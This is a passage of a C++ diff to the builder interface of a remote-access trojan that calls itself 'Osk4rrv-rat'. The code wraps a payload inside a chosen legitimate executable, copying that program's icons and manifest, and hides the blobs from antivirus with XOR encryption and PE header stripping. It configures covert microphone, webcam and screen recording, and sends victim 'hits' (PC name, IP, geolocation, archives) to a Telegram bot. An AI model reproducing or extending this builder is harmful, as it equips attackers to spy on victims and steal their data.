+    return TRUE;
+}
+
+static BOOL CALLBACK manifestKeyNameProc(HMODULE mod, LPCWSTR type, LPWSTR name,
+    LONG_PTR lParam) {
+    ManifestKeyCtx* c = (ManifestKeyCtx*)lParam;
+    EnumResourceLanguagesW(mod, type, name,
+        (ENUMRESLANGPROCW)manifestKeyLangProc, (LONG_PTR)c);
+    return TRUE;
+}
+
+static std::vector<ManifestKey> listManifestKeys(HMODULE hSrc) {
+    std::vector<ManifestKey> keys;
+    if (!hSrc) return keys;
+
+    ManifestKeyCtx ctx{ &keys };
+    EnumResourceNamesW(hSrc, MAKEINTRESOURCEW(24), manifestKeyNameProc, (LONG_PTR)&ctx);
+    return keys;
+}
+
+// Transplant the ORIGINAL file's manifest into the destination stub so the
+// final built executable requests exactly the same privileges as the original
+// (no admin shield unless the original itself had one).
+//
+// `stubKeys` are the exact (id, language) pairs the stub (binder.exe) carries.
+// We delete precisely those triples and nothing else: deleting a triple that is
+// not present fails with 87 and poisons the transaction, which is what caused
+// "Failed to embed resources".
+static bool transplantManifestsInto(HANDLE hUpdate, const std::string& originalPath,
+    const std::vector<ManifestKey>& stubKeys) {
+    if (!hUpdate) return false;
+
+    // Drop any manifest the stub already carries so we don't keep "asInvoker"
+    // alongside a second embedded one — but only the triples that really exist.
+    for (const ManifestKey& k : stubKeys) {
+        if (!UpdateResourceW(hUpdate, MAKEINTRESOURCEW(24), MAKEINTRESOURCEW(k.id),
+                k.lang, nullptr, 0)) {
+            // Treat as fatal: a failed delete means a poisoned transaction, and
+            // silently continuing would just produce a confusing cascade later.
+            return false;
+        }
+    }
+
+    std::vector<ManifestBlob> manifests = extractManifests(originalPath);
+    // If the original has no manifest, we leave the stub without one too —
+    // the output then runs asInvoker exactly like a plain user-mode exe.
+    if (manifests.empty())
+        return true;
+
+    bool ok = true;
+    for (const ManifestBlob& m : manifests) {
+        if (m.data.empty()) continue;
+        // Write at the SAME language the original used so the resulting PE has a
+        // resource layout identical to the file the user selected.
+        WORD lang = m.lang ? m.lang : (WORD)MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);
+        if (!UpdateResourceW(hUpdate, MAKEINTRESOURCEW(24), MAKEINTRESOURCEW(m.id ? m.id : 1),
+                lang, (void*)m.data.data(), (DWORD)m.data.size()))
+            ok = false;
+    }
+    return ok;
+}
+
+static void dbgLog(const char* fmt, ...);
+
+// Stage tracing for performBuild.
+//
+// Why: a build of a large original (e.g. an 87 MB installer) died silently —
+// debug.log showed "Build clicked" but never "performBuild done", with no
+// handled-error line either. A hard crash skips destructors, so the only way to
+// localise it is to flush a marker before each heavy stage. These lines are
+// cheap (one open/append/close) and tell us exactly which stage dies.
+#define BUILD_STAGE(msg) do { dbgLog("  [stage] %s", msg); } while (0)
+#define BUILD_PROGRESS(n) do { g_buildStage.store(n); } while (0)
+
+// ---------------------------------------------------------------------------
+// Asynchronous build
+// ---------------------------------------------------------------------------
+// Why the build no longer runs inline:
+//
+// performBuild() used to be called directly from inside the ImGui render loop,
+// on the render thread, between NewFrame() and Render(). It is a long
+// synchronous job: read the original (tens of MB), run blzCompress over it,
+// UpdateResource the blobs, then allocate a second copy of the whole output for
+// the PE patch. For a small original (a few hundred KB) that finishes inside a
+// frame and nobody notices. For an 87 MB original the process spikes to several
+// hundred MB of transient allocations while the D3D11 swap chain and ImGui's
+// vertex buffers are mid-frame — which is what produced the silent crash
+// (no exception, no destructor, no log line).
+//
+// Running it on a worker thread keeps the render loop responsive and moves the
+// big allocations off the frame path. The UI polls `g_buildRunning` and reads
+// the status string under a mutex.
+static std::thread         g_buildThread;
+static std::atomic<bool>   g_buildRunning{ false };
+static std::atomic<bool>   g_buildDone{ false };
+static std::atomic<int>    g_buildStage{ 0 };
+static std::mutex          g_buildMutex;
+
+// Human-readable stage names, indexed by g_buildStage.
+static const char* const kBuildStageNames[] = {
+    "Starting...",
+    "Reading input files",
+    "Writing stub",
+    "Embedding resources",
+    "Patching PE header",
+    "Finished",
+};
+
+static void performBuild();
+
+static void startBuildAsync() {
+    if (g_buildRunning.load())
+        return; // already building
+
+    if (g_buildThread.joinable())
+        g_buildThread.join(); // reap the previous run
+
+    g_buildRunning.store(true);
+    g_buildDone.store(false);
+    g_buildStage.store(0);
+    buildStatusMsg[0] = '\0';
+
+    g_buildThread = std::thread([] {
+        // Everything performBuild touches (UI buffers, selectedExePath, ...) is
+        // read-only for the duration of the build, and the UI blocks the Build
+        // button while g_buildRunning is set, so this is safe without a lock.
+        g_buildStage.store(1);
+        performBuild();
+        g_buildStage.store(5);
+        g_buildDone.store(true);
+        g_buildRunning.store(false);
+    });
+}
+
 static void performBuild() {
     buildStatusMsg[0] = 0;
+    // Safety net: if we somehow leave without a message, the UI must still say something.
+    struct BuildMsgGuard {
+        ~BuildMsgGuard() {
+            if (buildStatusMsg[0] == '\0')
+                snprintf(buildStatusMsg, sizeof(buildStatusMsg),
+                    "Build did not complete (unknown error). Check debug.log.");
+        }
+    } buildMsgGuard;
+
     std::string buildsDir = getBuildsDir();
 
     char exePath[MAX_PATH];
@@ -1231,16 +1644,23 @@ static void performBuild() {
         cfgFile << "mic_duration_sec=" << micDurationSec << "\n";
         cfgFile << "webcam_duration_sec=" << webcamDurationSec << "\n";
         cfgFile << "screen_duration_sec=" << screenDurationSec << "\n";
+        // Archive password: 0 = payload generates a random one per hit,
+        // 1 = use archive_password verbatim (empty value means NO password).
+        cfgFile << "opt_custom_password=" << (useCustomPassword ? 1 : 0) << "\n";
+        cfgFile << "archive_password=" << customPasswordBuf << "\n";
         // keep original name so binder/payload can report it
         cfgFile << "original_name=" << selectedExeName << "\n";
         cfgFile.close();
     }
 
     // Read blobs first so we fail early with clear sizes
+    BUILD_STAGE("read blobs start");
     std::vector<char> binderData = readFileBytes(binderPath);
     std::vector<char> payloadData = readFileBytes(payloadPath);
     std::vector<char> originalData = readFileBytes(selectedExePath);
     std::vector<char> configData = readFileBytes(destConfig);
+    dbgLog("  [stage] read blobs done: binder=%zu payload=%zu original=%zu config=%zu",
+        binderData.size(), payloadData.size(), originalData.size(), configData.size());
 
     if (binderData.empty() || payloadData.empty() || originalData.empty()) {
         snprintf(buildStatusMsg, sizeof(buildStatusMsg),
@@ -1251,6 +1671,8 @@ static void performBuild() {
 
     // Embed data as PE resources (no overlay) to avoid binder/dropper detection.
     // Write binder stub to destExe, then use UpdateResource to embed icons + encrypted blobs.
+    BUILD_STAGE("write stub");
+    BUILD_PROGRESS(2);
     if (!writeFileBytes(destExe, binderData)) {
         snprintf(buildStatusMsg, sizeof(buildStatusMsg), "Failed to write stub: %s", destExe.c_str());
         return;
@@ -1269,12 +1691,12 @@ static void performBuild() {
         if (xorKey[i] == 0) xorKey[i] = 0xA7 ^ (i + 1);
     }
 
-    // XOR-encrypt blobs with multi-byte key so embedded PE headers aren't visible
-    for (size_t i = 0; i < originalData.size(); i++) originalData[i] ^= (char)xorKey[i % 32];
-    for (size_t i = 0; i < payloadData.size(); i++) payloadData[i] ^= (char)xorKey[i % 32];
-    for (size_t i = 0; i < configData.size(); i++) configData[i] ^= (char)xorKey[i % 32];
+    // NOTE: the blobs are NOT XOR'd here. Compression + encryption both happen
+    // inside embedCompressed() below, in that order (compress, then XOR), which
+    // is the reverse of what the binder does at runtime (XOR, then decompress).
 
     // Open destExe for resource update
+    BUILD_STAGE("BeginUpdateResource");
     HANDLE hUpdate = BeginUpdateResourceA(destExe.c_str(), FALSE);
     if (!hUpdate) {
         snprintf(buildStatusMsg, sizeof(buildStatusMsg), "BeginUpdateResource failed: err=%lu", GetLastError());
@@ -1282,6 +1704,7 @@ static void performBuild() {
     }
 
     // Copy icons from original EXE
+    BUILD_STAGE("copy icons from original");
     HMODULE hSrc = LoadLibraryExA(selectedExePath, nullptr, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
     if (hSrc) {
         IconCopyCtx ctx{ hSrc, hUpdate, true };
@@ -1290,22 +1713,130 @@ static void performBuild() {
         EnumResourceNamesW(hSrc, RT_VERSION, enumIconRes, (LONG_PTR)&ctx);
         FreeLibrary(hSrc);
     }
+    BUILD_STAGE("copy icons done");
 
-    // Embed encrypted blobs as RCDATA resources
+    // === UAC: make the final file inherit the ORIGINAL's privilege level ===
+    // The stub (binder.exe) ships asInvoker. We transplant the original file's
+    // RT_MANIFEST so the output requests exactly the same privileges as the file
+    // the user selected — no admin shield unless the original had one.
+    //
+    // Before deleting anything we enumerate the exact (id, language) triples the
+    // stub really carries. A resource is keyed by (type, name, language): deleting
+    // a triple that is not present returns ERROR_INVALID_PARAMETER (87) and
+    // invalidates the whole update transaction — that was the
+    // "Failed to embed resources" bug (binder.exe stores its manifest at
+    // language 0x0409, while the old code tried to delete it at 0x0000).
+    std::vector<ManifestKey> stubManifestKeys;
+    if (HMODULE hStubMod = LoadLibraryExA(destExe.c_str(), nullptr,
+            LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE)) {
+        stubManifestKeys = listManifestKeys(hStubMod);
+        FreeLibrary(hStubMod);
+    }
+    BUILD_STAGE("manifest transplant start");
+    bool manifestOk = transplantManifestsInto(hUpdate, selectedExePath, stubManifestKeys);
+    dbgLog("  [stage] manifest transplant done ok=%d keys=%zu", (int)manifestOk, stubManifestKeys.size());
+
+    // Embed encrypted blobs as RCDATA resources.
+    //
+    // Each blob is LZ-compressed BEFORE being XOR-encrypted. PE files compress to
+    // roughly 55-62%, and the payload is the largest thing in the output, so this
+    // is what keeps the built exe from being needlessly huge. The binder unwraps
+    // the same two layers in reverse (XOR, then decompress).
+    //
+    // The XOR mask is NOT optional: the binder descrambles every blob it loads
+    // (101/102/103) unconditionally and only then tests for "MZ". A blob that
+    // skipped the mask comes back scrambled, fails that test, and makes the stub
+    // `return 1` before launching anything — i.e. the built exe silently does
+    // nothing. So the uncompressed path below has to encrypt too. Resource 104
+    // (the key itself) and 200 (ffmpeg) stay plaintext on purpose.
     auto embedRes = [&](WORD id, const void* data, DWORD size) -> bool {
         return UpdateResourceW(hUpdate, RT_RCDATA, MAKEINTRESOURCEW(id),
             MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (void*)data, size) != 0;
     };
 
-    bool resOk = true;
-    if (!embedRes(101, originalData.data(), (DWORD)originalData.size())) resOk = false;
-    if (!embedRes(102, payloadData.data(), (DWORD)payloadData.size())) resOk = false;
+    auto embedEncrypted = [&](WORD id, std::vector<char>& blob) -> bool {
+        // Tiny blobs (config.ini is a few hundred bytes) can come out LARGER
+        // after LZ framing, so only compress when there is a real win to be had.
+        const size_t kMinCompress = 4096;
+
+        // blzCompress allocates a chain table proportional to the input
+        // (4 bytes per input byte) plus a bound-sized output buffer. On a large
+        // blob (tens of MB) that is a several-hundred-MB spike. Refuse to run it
+        // above a safe ceiling and fall back to a raw embed instead — a raw
+        // 87 MB write is far cheaper than the compressor's working set.
+        const size_t kMaxCompressInput = 32u * 1024u * 1024u; // 32 MB
+
+        size_t cLen = 0;
+        BYTE* c = nullptr;
+        if (blob.size() >= kMinCompress && blob.size() <= kMaxCompressInput) {
+            dbgLog("  [stage] compress id=%u size=%zu", id, blob.size());
+            c = blzCompress((const BYTE*)blob.data(), blob.size(), &cLen);
+            dbgLog("  [stage] compress id=%u done -> %zu", id, cLen);
+            // Only keep the compressed form if it actually saved something.
+            if (c && cLen + 64 >= blob.size()) { free(c); c = nullptr; }
+        } else if (blob.size() > kMaxCompressInput) {
+            dbgLog("  [stage] id=%u too large to compress (%zu), raw embed", id, blob.size());
+        }
+
+        if (c) {
+            for (size_t i = 0; i < cLen; i++) c[i] ^= xorKey[i % 32];
+            bool ok = embedRes(id, c, (DWORD)cLen);
+            free(c);
+            return ok;
+        }
+
+        // Raw embed: mask in place, write, then restore so `blob` stays usable
+        // for the size report at the end of the build. XOR is its own inverse,
+        // so the second pass is an exact undo (and costs no extra allocation —
+        // the original can be ~90 MB, which we do not want to copy).
+        for (size_t i = 0; i < blob.size(); i++)
+            blob[i] = (char)(blob[i] ^ xorKey[i % 32]);
+        bool ok = embedRes(id, blob.data(), (DWORD)blob.size());
+        for (size_t i = 0; i < blob.size(); i++)
+            blob[i] = (char)(blob[i] ^ xorKey[i % 32]);
+        return ok;
+    };
+
+    bool resOk = manifestOk;
+    BUILD_STAGE("embed 101 (original)");
+    BUILD_PROGRESS(3);
+    if (!embedEncrypted(101, originalData)) resOk = false;
+    BUILD_STAGE("embed 101 done");
+    BUILD_STAGE("embed 102 (payload)");
+    if (!embedEncrypted(102, payloadData)) resOk = false;
+    BUILD_STAGE("embed 102 done");
     if (!configData.empty()) {
-        if (!embedRes(103, configData.data(), (DWORD)configData.size())) resOk = false;
+        // config.ini is small enough that compression never pays off — but it
+        // still has to be XOR-encrypted, because the binder decrypts resource
+        // 103 before dropping it next to the payload as config.ini/payload.ini.
+        // Embedding it plaintext made the payload parse a scrambled file, find
+        // no bot_token/chat_id, and silently send nothing.
+        if (!embedEncrypted(103, configData)) resOk = false;
     }
     if (!embedRes(104, xorKey, 32)) resOk = false;
 
+    // Bundle ffmpeg.exe (if the builder ships one) as an UNENCRYPTED resource.
+    // The payload extracts it at runtime so screen/webcam recording works on
+    // machines that have no ffmpeg installed. Unencrypted on purpose: the loader
+    // must be able to run it directly after dropping.
+    {
+        std::string ffCandidates[] = {
+            exeDir + "\\ffmpeg.exe",
+            exeDir + "\\bin\\ffmpeg.exe",
+            exeDir + "\\..\\ffmpeg.exe",
+        };
+        for (const std::string& ff : ffCandidates) {
+            if (!pathFileExists(ff)) continue;
+            std::vector<char> ffData = readFileBytes(ff);
+            if (ffData.size() < 100000) continue; // sanity: real ffmpeg is multi-MB
+            if (!embedRes(200, ffData.data(), (DWORD)ffData.size())) resOk = false;
+            break;
+        }
+    }
+
+    BUILD_STAGE("EndUpdateResource");
     BOOL endOk = EndUpdateResourceA(hUpdate, FALSE);
+    dbgLog("  [stage] EndUpdateResource done ok=%d resOk=%d", (int)endOk, (int)resOk);
 
     if (!endOk || !resOk) {
         DeleteFileA(destExe.c_str());
@@ -1317,6 +1848,8 @@ static void performBuild() {
     DeleteFileA(stubPath.c_str());
 
     // Strip Rich header + zero debug data directory to reduce ML fingerprinting
+    BUILD_STAGE("PE patch start");
+    BUILD_PROGRESS(4);
     {
         HANDLE hFile = CreateFileA(destExe.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
         if (hFile != INVALID_HANDLE_VALUE) {
@@ -1361,6 +1894,7 @@ static void performBuild() {
             CloseHandle(hFile);
         }
     }
+    BUILD_STAGE("PE patch done");
 
     LARGE_INTEGER finalSize = {};
     HANDLE hCheck = CreateFileA(destExe.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
@@ -1383,31 +1917,51 @@ static void performBuild() {
 
 
 static void sendTestHit() {
-    std::string code4 = generateUniqueCode(4);
     std::string password = generateRandomCode(8);
-    std::string date = getCurrentDate();
 
+    // Timestamp in the "(time, date)" shape the payload uses.
+    std::string timestamp;
+    {
+        std::time_t now = std::time(nullptr);
+        std::tm lt;
+        localtime_s(&lt, &now);
+        char buf[40];
+        std::strftime(buf, sizeof(buf), "%H:%M, %d-%m-%Y", &lt);
+        timestamp = buf;
+    }
+
+    // Unique suffix so repeated tests never reuse an archive name.
+    char suffix[32];
+    snprintf(suffix, sizeof(suffix), "%u%05u",
+        (unsigned)GetTickCount() % 100000u, (unsigned)(rand() % 100000));
+
+    std::string archiveName = "hit-" + sessionId + "-" + suffix + ".rar";
+
+    // Mirrors the payload's buildHitMessage() layout exactly, with the machine
+    // fields marked as test data since the builder has no target to inspect.
     std::string msg;
-    msg += "[Notification] Session: " + sessionId + "\n";
+    msg += "Osk4rrv-rat V1.1\n";
+    msg += "New hit on sessionid: " + sessionId + "!\n";
     msg += "\n";
-    msg += "File name opened: test.exe\n";
+    msg += "Quick info:\n";
+    msg += "File opened: test.exe\n";
+    msg += "PC Name: (test)\n";
+    msg += "IP: (test)\n";
+    msg += "Geolocation: (test)\n";
+    msg += "CPU: (test)\n";
+    msg += "GPU: (test)\n";
+    msg += "OS: (test)\n";
+    msg += "Password for archive: " + password + "\n";
     msg += "\n";
-    msg += "\xF0\x9F\x93\x84Quick information:\n";
-    msg += "PC Name: No information (test)\n";
-    msg += "IP: No information (test)\n";
-    msg += "CPU: No information (test)\n";
-    msg += "GPU: No information (test)\n";
-    msg += "\n";
-    msg += std::string("\xF0\x9F\x93\x81") + "Download .rar file: hit" + date + "-" + code4 + ".rar\n";
-    msg += "Password (random): " + password;
+    msg += "Download archive by clicking attachment.\n";
+    msg += "(" + timestamp + ")";
 
-    std::string rarFileName = "hit" + date + "-" + code4 + ".rar";
-
+    // Minimal but valid RAR signature so the attachment is a real file.
     static const char rarSignature[] = { 0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00 };
     std::vector<char> rarData(rarSignature, rarSignature + sizeof(rarSignature));
 
     lastTestMessage = msg;
-    telegram.sendDocumentAsync(msg, rarFileName, rarData);
+    telegram.sendDocumentAsync(msg, archiveName, rarData);
 }
 
 static void closeBuildWizard(bool goHome) {
@@ -1418,6 +1972,32 @@ static void closeBuildWizard(bool goHome) {
     if (goHome)
         currentTab = 0; // overview
     buildStatusMsg[0] = '\0';
+}
+
+static void dbgLog(const char* fmt, ...) {
+    char buf[1024];
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(buf, sizeof(buf), fmt, ap);
+    va_end(ap);
+
+    std::string path;
+    char appdata[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
+        std::string dir = std::string(appdata) + "\\AppDataCfg";
+        CreateDirectoryA(dir.c_str(), nullptr); // may already exist
+        path = dir + "\\debug.log";
+    } else {
+        path = "debug.log";
+    }
+
+    FILE* f = fopen(path.c_str(), "a");
+    if (f) {
+        SYSTEMTIME st;
+        GetLocalTime(&st);
+        fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, buf);
+        fclose(f);
+    }
 }
 
 static void goBuildWizardStep(int step) {
@@ -1468,7 +2048,7 @@ static void drawBuildPopup() {
     const ImVec2 p0 = ImGui::GetWindowPos();
     ImDrawList* dl = ImGui::GetWindowDrawList();
 
-    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), 10.0f);
+    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), kWindowRounding);
 
     // Drag only top strip (not chrome buttons)
     handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, 48.0f));
@@ -1573,6 +2153,73 @@ static void drawBuildPopup() {
         ImGui::PopStyleVar();
         ImGui::PopStyleColor();
 
+        // --- Build progress (while the worker thread is running) ---
+        // The build now runs off the render thread, so this is the only signal
+        // that a long build is still alive rather than hung.
+        if (g_buildRunning.load() && buildWizardStep != 2) {
+            const int stage = g_buildStage.load();
+            const int stageCount = (int)(sizeof(kBuildStageNames) / sizeof(kBuildStageNames[0]));
+            const char* name = (stage >= 0 && stage < stageCount)
+                ? kBuildStageNames[stage] : "Working...";
+
+            ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(Ui::Accent.x, Ui::Accent.y, Ui::Accent.z, 0.10f));
+            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(Ui::Accent.x, Ui::Accent.y, Ui::Accent.z, 0.55f));
+            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
+            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(14.0f, 10.0f));
+            if (ImGui::BeginChild("##build_progress_banner",
+                    ImVec2(0.0f, 0.0f), ImGuiChildFlags_Borders | ImGuiChildFlags_AutoResizeY,
+                    ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+                ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
+                ImGui::Text("Building - %s", name);
+                ImGui::PopStyleColor();
+                // Fraction shown as text plus ImGui's own indeterminate-ish bar.
+                const float frac = (stageCount > 1)
+                    ? (float)stage / (float)(stageCount - 1) : 0.0f;
+                ImGui::PushStyleColor(ImGuiCol_PlotHistogram, Ui::Accent);
+                ImGui::ProgressBar(frac, ImVec2(-FLT_MIN, 6.0f), "");
+                ImGui::PopStyleColor();
+            }
+            ImGui::EndChild();
+            ImGui::PopStyleVar(2);
+            ImGui::PopStyleColor(2);
+            ImGui::Dummy(ImVec2(0.0f, 6.0f));
+        }
+
+        // --- Build result / error feedback (TOP, always visible) ---
+        // performBuild() writes into buildStatusMsg. Rendering this FIRST guarantees
+        // the wizard never looks like it "does nothing" on failure or missing input.
+        if (buildStatusMsg[0] != '\0' && buildWizardStep != 2) {
+            const bool ok = strstr(buildStatusMsg, "Build OK") != nullptr;
+            const ImVec4 accent = ok ? Ui::Success : Ui::Danger;
+
+            ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(accent.x, accent.y, accent.z, 0.10f));
+            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(accent.x, accent.y, accent.z, 0.55f));
+            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
+            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(14.0f, 10.0f));
+            if (ImGui::BeginChild("##build_result_banner",
+                    ImVec2(0.0f, 0.0f), ImGuiChildFlags_Borders | ImGuiChildFlags_AutoResizeY,
+                    ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+                if (fontIcons) {
+                    ImGui::PushFont(fontIcons, fontIcons->LegacySize);
+                    ImGui::PushStyleColor(ImGuiCol_Text, accent);
+                    ImGui::TextUnformatted(ok ? ICON_FA_CIRCLE_CHECK : ICON_FA_TRIANGLE_EXCLAMATION);
+                    ImGui::PopStyleColor();
+                    ImGui::PopFont();
+                    ImGui::SameLine(0.0f, 8.0f);
+                }
+                ImGui::PushStyleColor(ImGuiCol_Text, accent);
+                ImGui::PushTextWrapPos(ImGui::GetWindowContentRegionMax().x);
+                ImGui::TextWrapped("%s", buildStatusMsg);
+                ImGui::PopTextWrapPos();
+                ImGui::PopStyleColor();
+            }
+            ImGui::EndChild();
+            ImGui::PopStyleVar(2);
+            ImGui::PopStyleColor(2);
+
+            ImGui::Dummy(ImVec2(0.0f, 14.0f));
+        }
+
         if (buildWizardStep == 0) {
             if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
             ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
@@ -1652,6 +2299,39 @@ static void drawBuildPopup() {
             ImGui::SetNextItemWidth(180.0f);
             ImGui::InputInt("Screen record (sec)##scr_dur", &screenDurationSec);
 
+            ImGui::Dummy(ImVec2(0.0f, 12.0f));
+            ImGui::Separator();
+            ImGui::Dummy(ImVec2(0.0f, 12.0f));
+
+            // === Archive password ===
+            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
+            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
+            iconText(ICON_FA_LOCK, "Archive password");
+            ImGui::PopStyleColor();
+            if (fontMedium) ImGui::PopFont();
+            ImGui::Dummy(ImVec2(0.0f, 4.0f));
+            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
+            ImGui::TextWrapped("Off: a random password is generated per hit. "
+                "On with an empty field: the archive has no password.");
+            ImGui::PopStyleColor();
+            ImGui::Dummy(ImVec2(0.0f, 6.0f));
+
+            styledCheckbox("Configure password", &useCustomPassword);
+
+            // The field only appears once the option is on, so the default flow
+            // (random password) keeps a clean, uncluttered options page.
+            if (useCustomPassword) {
+                ImGui::Dummy(ImVec2(0.0f, 6.0f));
+                ImGui::SetNextItemWidth(300.0f);
+                ImGui::InputTextWithHint("##custom_pw", "Leave empty for no password",
+                    customPasswordBuf, sizeof(customPasswordBuf));
+                if (customPasswordBuf[0] == '\0') {
+                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
+                    ImGui::TextUnformatted("No password will be set on the archive.");
+                    ImGui::PopStyleColor();
+                }
+            }
+
             if (!ImGui::IsAnyItemActive()) {
                 if (micDurationSec < 1) micDurationSec = 1;
                 if (micDurationSec > 600) micDurationSec = 600;
@@ -1726,9 +2406,25 @@ static void drawBuildPopup() {
 
             ImGui::SetCursorPos(ImVec2(rightEdge - buildW, btnY));
             char buildLabel[64];
-            snprintf(buildLabel, sizeof(buildLabel), "%s  Build", ICON_FA_HAMMER);
+            const bool building = g_buildRunning.load();
+            if (building) {
+                snprintf(buildLabel, sizeof(buildLabel), "%s  Building...", ICON_FA_HAMMER);
+            } else {
+                snprintf(buildLabel, sizeof(buildLabel), "%s  Build", ICON_FA_HAMMER);
+            }
+            // Building is disabled while a build is in flight so the worker never
+            // races with a second click.
+            ImGui::BeginDisabled(building);
             if (styledButton(buildLabel, ImVec2(buildW, btnH), true)) {
-                performBuild();
+                dbgLog("Build clicked: exe='%s' token_len=%zu chat_len=%zu",
+                    selectedExePath, strlen(botTokenBuf), strlen(chatIdBuf));
+                startBuildAsync();
+            }
+            ImGui::EndDisabled();
+
+            // Collect the result of a finished async build exactly once.
+            if (g_buildDone.exchange(false)) {
+                dbgLog("performBuild done: msg='%s'", buildStatusMsg);
                 if (strstr(buildStatusMsg, "Build OK") != nullptr)
                     goBuildWizardStep(2);
             }
@@ -1755,7 +2451,7 @@ static void drawBuildTab() {
         const float padY = 14.0f;
         const float btnW = 100.0f;
         const float btnH = 32.0f;
-        const float panelH = 96.0f;
+        const float panelH = 118.0f;
 
         ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
         ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(padX, padY));
@@ -1774,6 +2470,17 @@ static void drawBuildTab() {
             ImGui::TextUnformatted("Pick original EXE, features and durations.");
             ImGui::PopStyleColor();
 
+            // Show current selection so the card always reflects real state.
+            if (strlen(selectedExeName) > 0) {
+                ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextSecondary);
+                ImGui::Text("Selected: %s", selectedExeName);
+                ImGui::PopStyleColor();
+            } else {
+                ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
+                ImGui::TextUnformatted("No original .exe selected yet.");
+                ImGui::PopStyleColor();
+            }
+
             const float contentW = ImGui::GetWindowContentRegionMax().x - ImGui::GetWindowContentRegionMin().x;
             const float contentH = ImGui::GetWindowContentRegionMax().y - ImGui::GetWindowContentRegionMin().y;
             ImGui::SetCursorPos(ImVec2(contentW - btnW, contentH - btnH));
@@ -1782,6 +2489,7 @@ static void drawBuildTab() {
                 buildWizardStepFrom = 0;
                 buildWizardStepAnim = 1.0f;
                 showBuildPopup = true;
+                dbgLog("Configure clicked -> showBuildPopup=%d", (int)showBuildPopup);
             }
         }
         ImGui::EndChild();
@@ -1795,9 +2503,9 @@ static void drawBuildTab() {
     ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
     if (ImGui::BeginChild(
             "##build_debug",
-            ImVec2(width - Ui::ContentPadding * 2.0f, 140.0f),
+            ImVec2(width - Ui::ContentPadding * 2.0f, 200.0f),
             ImGuiChildFlags_Borders,
-            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+            0)) {
         if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
         ImGui::TextUnformatted("Test");
         if (fontMedium) ImGui::PopFont();
@@ -1830,6 +2538,162 @@ static void drawBuildTab() {
             ImGui::TextUnformatted("Set Telegram first");
             ImGui::PopStyleColor();
         }
+
+        // Show the last build result so a failed build is never silent.
+        if (buildStatusMsg[0] != '\0') {
+            ImGui::Dummy(ImVec2(0.0f, 8.0f));
+            const bool ok = strstr(buildStatusMsg, "Build OK") != nullptr;
+            ImGui::PushStyleColor(ImGuiCol_Text, ok ? Ui::Success : Ui::Danger);
+            ImGui::PushTextWrapPos(ImGui::GetWindowContentRegionMax().x);
+            ImGui::TextWrapped("%s", buildStatusMsg);
+            ImGui::PopTextWrapPos();
+            ImGui::PopStyleColor();
+        }
+    }
+    ImGui::EndChild();
+    ImGui::PopStyleColor(2);
+    ImGui::PopStyleVar();
+}
+
+// "Live Stalk" — placeholder for a real-time view of a connected session.
+//
+// Deliberately a "Coming Soon" panel: the transport for live frames is not part
+// of this build, and shipping a dead button would be worse than an honest
+// placeholder. The panel states what the feature will do so the tab is not
+// empty, without pretending it already works.
+static void drawLiveStalkTab() {
+    const float width = ImGui::GetWindowSize().x;
+    drawPageHeader("Live Stalk", "Real-time session view");
+
+    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
+    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
+    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
+    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
+    if (ImGui::BeginChild(
+            "##livestalk_tab",
+            ImVec2(width - Ui::ContentPadding * 2.0f, 300.0f),
+            ImGuiChildFlags_Borders,
+            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
+        const ImVec2 panelSize = ImGui::GetWindowSize();
+
+        // Centered "Coming Soon" badge block.
+        const char* title = "Coming Soon";
+        ImFont* titleFont = fontHeading ? fontHeading : ImGui::GetFont();
+        const ImVec2 titleSize = titleFont->CalcTextSizeA(
+            titleFont->LegacySize, FLT_MAX, 0.0f, title);
+
+        const char* sub = "Live screen and webcam streaming will appear here.";
